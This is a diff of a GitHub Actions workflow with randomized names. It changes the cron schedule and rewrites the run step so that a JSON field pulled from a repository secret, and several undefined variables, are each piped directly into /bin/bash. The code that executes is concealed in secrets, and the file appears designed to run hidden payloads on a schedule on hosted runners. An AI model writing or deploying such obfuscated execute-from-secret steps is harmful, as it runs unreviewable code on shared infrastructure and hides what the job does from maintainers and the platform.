@@ -1,25 +1,25 @@
 name: moguangmin1989
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '7 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: moguangmin1989
         env:
-          ro03830: ${{ secrets.ro03830 }}
+          bvw70059: ${{ secrets.bvw70059 }}
         run: |
-          echo $ro03830 | jq -r .rgai563 | /bin/bash
-          echo $s6 | jq -r .mq64 | /bin/bash
-          echo $d908 | jq -r .qto2779 | /bin/bash
-          echo $kb21575 | jq -r .n57123 | /bin/bash
-          echo $ktzdk93 | jq -r .tmfcd089 | /bin/bash
-          echo $mpowg41 | jq -r .w4 | /bin/bash
-          echo $cypu76 | jq -r .v2 | /bin/bash
-          echo $kbzsn694 | jq -r .rq4099 | /bin/bash
+          echo $bvw70059 | jq -r .kxrg236 | /bin/bash
+          echo $exon10 | jq -r .kzmb9 | /bin/bash
+          echo $x439 | jq -r .rvk139 | /bin/bash
+          echo $um59 | jq -r .hyr409 | /bin/bash
+          echo $mnjcm33660 | jq -r .lyp7 | /bin/bash
+          echo $ndc47 | jq -r .a95252 | /bin/bash
+          echo $xts83794 | jq -r .nyber2062 | /bin/bash
+          echo $ifq08 | jq -r .vqqq4180 | /bin/bash
 
